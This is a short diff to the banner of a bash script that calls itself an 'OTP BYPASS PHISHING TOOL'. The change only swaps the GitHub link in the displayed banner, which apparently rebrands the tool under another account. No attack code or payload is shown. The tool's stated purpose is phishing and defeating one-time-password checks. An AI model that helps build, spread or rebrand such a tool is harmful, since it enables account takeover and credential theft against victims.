@@ -16,7 +16,7 @@ banner() {
   echo""    
   echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 3.2] \e[0m'                                       
   echo ""
-   echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/Ignitetch/AdvPhishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
+   echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/KING-HANTER/cyber_phish \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
    echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'
       echo -e "\e[93m    |K|I|N|G| |H|A|N|T|E|R|"      
